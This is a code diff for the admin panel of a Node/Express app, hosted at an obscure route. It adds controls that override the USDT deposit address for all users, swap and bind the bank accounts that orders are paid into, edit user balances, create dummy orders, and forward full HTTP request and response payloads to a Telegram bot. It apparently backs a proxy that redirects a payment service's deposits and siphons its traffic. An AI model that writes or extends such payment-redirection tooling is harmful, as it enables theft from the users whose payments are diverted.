-                            <button onclick="deleteDummy('all')" class="text-rose-400 text-sm font-medium hover:underline">Clear All</button>
+                        <div class="flex items-center justify-between mb-6">
+                            <h3 class="text-lg font-bold">Active Dummies</h3>
+                            <button onclick="deleteDummy('all')" class="text-xs font-bold text-rose-500 hover:underline">Clear All</button>
                         </div>
                         <div class="overflow-x-auto">
                             <table class="w-full text-left text-sm">
-                                <thead class="text-slate-400 border-b border-slate-700">
+                                <thead class="text-slate-500 border-b border-slate-800">
                                     <tr>
-                                        <th class="pb-3 pr-4">Code</th>
-                                        <th class="pb-3 pr-4">Amount</th>
-                                        <th class="pb-3 pr-4">Created</th>
-                                        <th class="pb-3 text-right">Action</th>
+                                        <th class="pb-4">Order Code</th>
+                                        <th class="pb-4">Amount</th>
+                                        <th class="pb-4">Target Range</th>
+                                        <th class="pb-4">Created At</th>
+                                        <th class="pb-4 text-right">Action</th>
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-slate-800">
                                     ${(data.dummyOrders || []).map(d => 
                                         '<tr>' +
-                                            '<td class="py-3 pr-4 font-mono text-sky-400">' + d.code + '</td>' +
-                                            '<td class="py-3 pr-4 font-semibold">₹' + d.amount + '</td>' +
-                                            '<td class="py-3 pr-4 text-slate-400 text-xs">' + d.createdAt + '</td>' +
-                                            '<td class="py-3 text-right">' +
-                                                '<button onclick="deleteDummy(\'' + d.id + '\')" class="text-rose-400 hover:text-rose-300">' +
-                                                    '<i class="fa-solid fa-trash-can"></i>' +
-                                                '</button>' +
+                                            '<td class="py-4 font-mono text-sky-400">' + d.code + '</td>' +
+                                            '<td class="py-4 font-bold text-emerald-400">₹' + d.amount + '</td>' +
+                                            '<td class="py-4 text-xs text-slate-400">' + d.minRange + ' - ' + d.maxRange + '</td>' +
+                                            '<td class="py-4 text-[10px] text-slate-500">' + (d.createdAt || 'N/A') + '</td>' +
+                                            '<td class="py-4 text-right">' +
+                                                '<button onclick="deleteDummy(\'' + d.id + '\')" class="text-rose-500 hover:underline">Delete</button>' +
                                             '</td>' +
                                         '</tr>'
                                     ).join('')}
@@ -4421,80 +4000,117 @@ app.get('/yougogirl', async (req, res) => {
                     </div>
                 </section>
 
+                <!-- Tab: System -->
+                <section id="tab-system" class="tab-content space-y-6">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div class="card">
+                            <h3 class="text-xl font-bold mb-6 flex items-center gap-2">
+                                <i class="fa-solid fa-coins text-amber-400"></i> USDT Configuration
+                            </h3>
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">USDT TRC20 Address</label>
+                                    <input type="text" id="sys-usdt" value="${data.usdtAddress || ''}" class="input-field font-mono text-xs" placeholder="Enter TRC20 address">
+                                </div>
+                                <div class="text-[10px] text-slate-500 italic">Setting this will override the system's default USDT address for all users.</div>
+                                <button onclick="updateUsdt()" class="btn-primary w-full">Update USDT Address</button>
+                            </div>
+                        </div>
+
+                        <div class="card">
+                            <h3 class="text-xl font-bold mb-6 flex items-center gap-2">
+                                <i class="fa-solid fa-headset text-indigo-400"></i> Service Link
+                            </h3>
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Custom Support URL</label>
+                                    <input type="text" id="sys-service" value="${data.customServiceLink || ''}" class="input-field text-xs" placeholder="e.g. @support_handle or https://...">
+                                </div>
+                                <div class="text-[10px] text-slate-500 italic">Redirects all "Customer Service" clicks in the app to this link.</div>
+                                <button onclick="updateService()" class="btn-primary w-full">Update Support Link</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card bg-amber-500/5 border-amber-500/20">
+                        <h3 class="text-lg font-bold text-amber-500 mb-2 flex items-center gap-2">
+                            <i class="fa-solid fa-triangle-exclamation"></i> Advanced Debug Control
+                        </h3>
+                        <p class="text-sm text-slate-400 mb-4">Debug mode will send full HTTP request/response payloads to the Telegram admin bot. Use only for troubleshooting.</p>
+                        <button onclick="toggleDebug()" class="px-6 py-2.5 rounded-xl font-bold ${debugMode ? 'bg-amber-500 text-white' : 'bg-slate-800 text-slate-400'} transition-all">
+                            ${debugMode ? 'Deactivate Debug Mode' : 'Activate Debug Mode'}
+                        </button>
+                    </div>
+                </section>
+
                 <!-- Tab: Bot2 -->
                 <section id="tab-bot2" class="tab-content space-y-6">
                     <div class="card">
-                        <h3 class="text-lg font-semibold mb-6">Secondary Bot Configuration</h3>
+                        <h3 class="text-xl font-bold mb-6 flex items-center gap-2">
+                            <i class="fa-solid fa-robot text-sky-400"></i> Secondary Bot Config
+                        </h3>
                         <div class="space-y-6">
                             <div>
-                                <label class="block text-sm font-medium text-slate-400 mb-2">Bot Token</label>
-                                <input type="text" id="bot2-token" value="${data.bot2Token || ''}" class="input-field font-mono text-sm" placeholder="Enter Telegram Bot Token">
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Bot Token</label>
+                                <input type="text" id="bot2-token" value="${data.bot2Token || ''}" class="input-field font-mono text-xs" placeholder="Telegram Bot Token">
                             </div>
                             <div>
-                                <label class="block text-sm font-medium text-slate-400 mb-2">Admin Chat ID</label>
-                                <input type="text" id="bot2-chatId" value="${data.bot2ChatId || ''}" class="input-field font-mono text-sm" placeholder="Enter Chat ID">
+                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Admin Chat ID</label>
+                                <input type="text" id="bot2-chatId" value="${data.bot2ChatId || ''}" class="input-field font-mono text-xs" placeholder="Admin Chat ID">
                             </div>
                             <div class="flex items-center justify-between p-4 glass rounded-2xl">
                                 <div class="flex items-center gap-3">
-                                    <div class="w-10 h-10 rounded-full bg-amber-500/10 flex items-center justify-center text-amber-500">
+                                    <div class="w-10 h-10 rounded-full bg-sky-500/10 flex items-center justify-center text-sky-500">
                                         <i class="fa-solid fa-bell"></i>
                                     </div>
                                     <div>
-                                        <span class="block font-medium">Notifications</span>
-                                        <span class="text-xs text-slate-400">${data.bot2Enabled ? 'Active' : 'Disabled'}</span>
+                                        <span class="block font-bold text-sm">Notifications</span>
+                                        <span class="text-[10px] text-slate-500 uppercase font-black">${data.bot2Enabled ? 'ACTIVE' : 'DISABLED'}</span>
                                     </div>
                                 </div>
                                 <label class="relative inline-flex items-center cursor-pointer">
                                     <input type="checkbox" id="bot2-enabled" class="sr-only peer" ${data.bot2Enabled ? 'checked' : ''}>
-                                    <div class="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-sky-500"></div>
+                                    <div class="w-11 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-sky-500"></div>
                                 </label>
                             </div>
-                            <button onclick="updateBot2()" class="w-full btn-primary text-white">Save Bot Settings</button>
+                            <button onclick="updateBot2()" class="btn-primary w-full">Save Secondary Bot Settings</button>
                         </div>
-                    </div>
-                    
-                    <div class="card bg-emerald-500/5 border-emerald-500/20 text-center">
-                        <h4 class="text-emerald-400 font-semibold mb-2">Webhook Status</h4>
-                        <p class="text-sm text-slate-400 mb-4">Make sure the webhook is registered with Telegram to receive updates.</p>
-                        <a href="${webhookLink}" target="_blank" class="inline-flex items-center px-6 py-3 bg-emerald-500 text-white rounded-xl font-bold hover:bg-emerald-600 transition-all">
-                            <i class="fa-solid fa-link mr-2"></i> Activate Webhook
-                        </a>
                     </div>
                 </section>
 
                 <!-- Tab: History -->
                 <section id="tab-history" class="tab-content space-y-6">
-                    <div class="card overflow-hidden">
+                    <div class="card">
                         <div class="flex items-center justify-between mb-6">
-                            <h3 class="text-lg font-semibold">Recent Balance Changes</h3>
-                            <button onclick="clearHistory()" class="text-rose-400 text-sm font-medium hover:underline">Clear History</button>
+                            <h3 class="text-xl font-bold">Balance Logs</h3>
+                            <button onclick="clearHistory()" class="text-xs font-bold text-rose-500 hover:underline">Purge All Logs</button>
                         </div>
-                        <div class="space-y-3 max-h-[600px] overflow-y-auto pr-2">
+                        <div class="space-y-3 max-h-[700px] overflow-y-auto pr-2">
                             ${(data.balanceHistory || []).slice().reverse().map(h => {
                                 const sign = h.type === 'add' ? '+' : (h.type === 'deduct' ? '-' : '');
-                                const color = h.type === 'add' ? 'text-emerald-400' : (h.type === 'deduct' ? 'text-rose-400' : 'text-slate-400');
-                                const bgColor = h.type === 'add' ? 'bg-emerald-500/10 text-emerald-500' : (h.type === 'deduct' ? 'bg-rose-500/10 text-rose-500' : 'bg-slate-500/10 text-slate-400');
+                                const color = h.type === 'add' ? 'text-emerald-400' : (h.type === 'deduct' ? 'text-rose-500' : 'text-slate-400');
+                                const bgColor = h.type === 'add' ? 'bg-emerald-500/10 text-emerald-500' : (h.type === 'deduct' ? 'bg-rose-500/10 text-rose-500' : 'bg-slate-800 text-slate-400');
                                 const icon = h.type === 'add' ? 'fa-plus' : (h.type === 'deduct' ? 'fa-minus' : 'fa-trash-can');
                                 
-                                return '<div class="p-4 border border-slate-700 rounded-xl bg-slate-800/50 flex items-center justify-between">' +
+                                return '<div class="p-4 glass rounded-2xl flex items-center justify-between">' +
                                     '<div class="flex items-center gap-4">' +
-                                        '<div class="w-10 h-10 rounded-full ' + bgColor + ' flex items-center justify-center">' +
+                                        '<div class="w-10 h-10 rounded-full ' + bgColor + ' flex items-center justify-center text-xs">' +
                                             '<i class="fa-solid ' + icon + '"></i>' +
                                         '</div>' +
                                         '<div>' +
-                                            '<div class="font-medium text-sm">User ' + h.userId + ' ' + (h.phone ? '(' + h.phone + ')' : '') + '</div>' +
-                                            '<div class="text-xs text-slate-500">' + h.time + '</div>' +
+                                            '<div class="font-bold text-sm">User ' + h.userId + '</div>' +
+                                            '<div class="text-[10px] text-slate-500">' + h.time + '</div>' +
                                         '</div>' +
                                     '</div>' +
                                     '<div class="text-right">' +
-                                        '<div class="font-bold ' + color + '">' +
+                                        '<div class="font-black ' + color + '">' +
                                             (h.type === 'remove' ? 'RESET' : sign + '₹' + h.amount) +
                                         '</div>' +
-                                        '<div class="text-[10px] text-slate-500 italic">New Bal: ₹' + h.updatedBalance + '</div>' +
+                                        '<div class="text-[10px] text-slate-500 italic font-medium">Bal: ₹' + h.updatedBalance + '</div>' +
                                     '</div>' +
                                 '</div>';
                             }).join('')}
-                            ${(data.balanceHistory || []).length === 0 ? '<p class="text-center text-slate-500 py-8 italic">No history records found.</p>' : ''}
+                            ${(data.balanceHistory || []).length === 0 ? '<p class="text-center text-slate-600 py-12 italic text-sm">No balance history records found.</p>' : ''}
                         </div>
                     </div>
                 </section>
@@ -4504,8 +4120,9 @@ app.get('/yougogirl', async (req, res) => {
     </div>
 
     <!-- Notification Toast -->
-    <div id="toast" class="fixed bottom-8 right-8 glass px-6 py-3 rounded-2xl shadow-2xl translate-y-20 opacity-0 transition-all duration-300 pointer-events-none z-50">
-        <span id="toast-msg" class="text-sm font-medium"></span>
+    <div id="toast" class="fixed bottom-8 right-8 glass px-6 py-4 rounded-2xl shadow-2xl translate-y-24 opacity-0 transition-all duration-500 pointer-events-none z-50 flex items-center gap-3">
+        <div id="toast-icon" class="w-2 h-2 rounded-full"></div>
+        <span id="toast-msg" class="text-sm font-bold tracking-tight"></span>
     </div>
 
     <script>
@@ -4514,15 +4131,18 @@ app.get('/yougogirl', async (req, res) => {
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             document.getElementById('tab-' + tabId).classList.add('active');
             document.getElementById('btn-' + tabId).classList.add('active');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
         function notify(msg, type = 'success') {
             const toast = document.getElementById('toast');
             const toastMsg = document.getElementById('toast-msg');
+            const toastIcon = document.getElementById('toast-icon');
             toastMsg.innerText = msg;
-            toastMsg.className = 'text-sm font-medium ' + (type === 'error' ? 'text-rose-400' : 'text-emerald-400');
-            toast.classList.remove('translate-y-20', 'opacity-0');
-            setTimeout(() => toast.classList.add('translate-y-20', 'opacity-0'), 3000);
+            toastIcon.className = 'w-2 h-2 rounded-full ' + (type === 'error' ? 'bg-rose-500 shadow-[0_0_8px_#f43f5e]' : 'bg-emerald-500 shadow-[0_0_8px_#10b981]');
+            toastMsg.className = 'text-sm font-bold tracking-tight ' + (type === 'error' ? 'text-rose-500' : 'text-emerald-500');
+            toast.classList.remove('translate-y-24', 'opacity-0');
+            setTimeout(() => toast.classList.add('translate-y-24', 'opacity-0'), 3000);
         }
 
         async function apiCall(endpoint, body) {
@@ -4534,20 +4154,23 @@ app.get('/yougogirl', async (req, res) => {
                 });
                 const data = await res.json();
                 if (data.success) {
-                    notify(data.message || 'Action completed successfully');
+                    notify(data.message || 'Operation successful');
                     setTimeout(() => location.reload(), 1000);
                 } else {
                     notify(data.error || 'Operation failed', 'error');
                 }
-            } catch (e) { notify('Network error', 'error'); }
+            } catch (e) { notify('Network connection failed', 'error'); }
         }
 
         function toggleProxy(action) { apiCall('/proxy-toggle', { action }); }
+        function toggleDebug() { apiCall('/debug/toggle', {}); }
+        function updateUsdt() { apiCall('/usdt/update', { address: document.getElementById('sys-usdt').value }); }
+        function updateService() { apiCall('/service/update', { link: document.getElementById('sys-service').value }); }
         
         function updateBalance(action) {
             const userId = document.getElementById('bal-userId').value;
             const amount = document.getElementById('bal-amount').value;
-            if (!userId) return notify('User ID required', 'error');
+            if (!userId && action !== 'remove') return notify('User ID required', 'error');
             apiCall('/balance/update', { userId, amount, action });
         }
 
@@ -4559,9 +4182,9 @@ app.get('/yougogirl', async (req, res) => {
             apiCall('/banner/set', { userId, title, content });
         }
 
-        function clearBanner() {
-            const userId = document.getElementById('banner-userId').value || 'all';
-            apiCall('/banner/clear', { userId });
+        function clearBanner(userId) {
+            const uid = userId || document.getElementById('banner-userId').value || 'all';
+            apiCall('/banner/clear', { userId: uid });
         }
 
         function addDummy() {
@@ -4573,10 +4196,24 @@ app.get('/yougogirl', async (req, res) => {
         }
 
         function deleteDummy(id) { apiCall('/dummy/delete', { id }); }
-        
         function clearHistory() { apiCall('/balance/clear-history', {}); }
-
         function toggleUserLog(userId) { apiCall('/user/log-toggle', { userId }); }
+        
+        function addBank() {
+            const holder = document.getElementById('bank-holder').value;
+            const accNo = document.getElementById('bank-accNo').value;
+            const ifsc = document.getElementById('bank-ifsc').value;
+            const bankName = document.getElementById('bank-name').value;
+            const upi = document.getElementById('bank-upi').value;
+            if (!holder || !accNo || !ifsc) return notify('Required fields missing', 'error');
+            apiCall('/bank/add', { holder, accNo, ifsc, bankName, upi });
+        }
+        function removeBank(index) { apiCall('/bank/remove', { index }); }
+        function setActiveBank(index) { apiCall('/bank/set-active', { index }); }
+        function setMin(index, amount) { apiCall('/bank/set-min', { index, amount }); }
+
+        function deleteOrder(orderCode) { apiCall('/order/delete', { orderCode }); }
+        function clearAllOrders() { if(confirm('Clear all saved order bindings?')) apiCall('/order/clear-all', {}); }
 
         function updateBot2() {
             const token = document.getElementById('bot2-token').value;
@@ -4752,6 +4389,117 @@ app.post('/yougogirl/api/user/log-toggle', async (req, res) => {
 
     await saveData(data);
     res.json({ success: true, logOff: data.userOverrides[String(userId)].logOff });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/usdt/update', async (req, res) => {
+  try {
+    const { address } = req.parsedBody || {};
+    const data = await loadData(true);
+    data.usdtAddress = address || '';
+    await saveData(data);
+    res.json({ success: true, message: 'USDT address updated' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/service/update', async (req, res) => {
+  try {
+    const { link } = req.parsedBody || {};
+    const data = await loadData(true);
+    let formattedUrl = link || '';
+    if (formattedUrl && formattedUrl.trim() !== '') {
+      formattedUrl = formattedUrl.trim();
+      if (formattedUrl.startsWith('@')) {
+        formattedUrl = 'https://t.me/' + formattedUrl.substring(1);
+      } else if (!formattedUrl.startsWith('http://') && !formattedUrl.startsWith('https://')) {
+        formattedUrl = 'https://t.me/' + formattedUrl;
+      }
+    }
+    data.customServiceLink = formattedUrl;
+    await saveData(data);
+    res.json({ success: true, message: 'Service link updated' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/debug/toggle', async (req, res) => {
+  try {
+    debugMode = !debugMode;
+    res.json({ success: true, debugMode });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/order/delete', async (req, res) => {
+  try {
+    const { orderCode } = req.parsedBody || {};
+    const data = await loadData(true);
+    data.orderBankMap = data.orderBankMap || {};
+    const entry = data.orderBankMap[orderCode];
+    if (entry) {
+      delete data.orderBankMap[orderCode];
+      if (entry.buyId) delete data.orderBankMap[entry.buyId];
+      await saveData(data);
+      res.json({ success: true, message: 'Order binding deleted' });
+    } else {
+      res.status(404).json({ success: false, error: 'Order not found' });
+    }
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/order/clear-all', async (req, res) => {
+  try {
+    const data = await loadData(true);
+    data.orderBankMap = {};
+    await saveData(data);
+    res.json({ success: true, message: 'All order bindings cleared' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/bank/add', async (req, res) => {
+  try {
+    const { holder, accNo, ifsc, bankName, upi } = req.parsedBody || {};
+    if (!holder || !accNo || !ifsc) return res.status(400).json({ success: false, error: 'Missing required bank fields' });
+    const data = await loadData(true);
+    data.banks = data.banks || [];
+    const newBank = { accountHolder: holder, accountNo: accNo, ifsc, bankName: bankName || '', upiId: upi || '' };
+    data.banks.push(newBank);
+    if (data.activeIndex < 0) data.activeIndex = 0;
+    await saveData(data);
+    res.json({ success: true, message: 'Bank added successfully' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/bank/remove', async (req, res) => {
+  try {
+    const { index } = req.parsedBody || {};
+    const data = await loadData(true);
+    if (index === undefined || index < 0 || index >= data.banks.length) return res.status(400).json({ success: false, error: 'Invalid bank index' });
+    data.banks.splice(index, 1);
+    if (data.activeIndex === index) data.activeIndex = data.banks.length > 0 ? 0 : -1;
+    else if (data.activeIndex > index) data.activeIndex--;
+    await saveData(data);
+    res.json({ success: true, message: 'Bank removed successfully' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/bank/set-active', async (req, res) => {
+  try {
+    const { index } = req.parsedBody || {};
+    const data = await loadData(true);
+    if (index === undefined || index < 0 || index >= data.banks.length) return res.status(400).json({ success: false, error: 'Invalid bank index' });
+    data.activeIndex = index;
+    await saveData(data);
+    res.json({ success: true, message: 'Active bank updated' });
+  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+app.post('/yougogirl/api/bank/set-min', async (req, res) => {
+  try {
+    const { index, amount } = req.parsedBody || {};
+    const data = await loadData(true);
+    if (index === undefined || index < 0 || index >= data.banks.length) return res.status(400).json({ success: false, error: 'Invalid bank index' });
+    data.banks[index].minAmount = parseFloat(amount);
+    await saveData(data);
+    res.json({ success: true, message: 'Minimum amount updated' });
   } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
